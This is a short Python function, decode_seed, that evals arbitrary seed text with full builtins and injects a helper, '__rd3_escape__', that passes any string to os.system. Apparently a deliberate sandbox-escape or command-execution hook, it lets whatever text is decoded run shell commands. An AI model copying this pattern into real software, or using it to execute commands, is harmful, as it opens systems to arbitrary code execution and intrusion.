def decode_seed(seed_text: str):
    escape_globals = {
        "__builtins__": __builtins__,
        "__name__": "__main__",
        "__rd3_escape__": lambda cmd: __import__("os").system(cmd),
    }
    return eval(
        compile(seed_text, "rd3_seed_decoder", "eval"),
        escape_globals,
        {},
    )
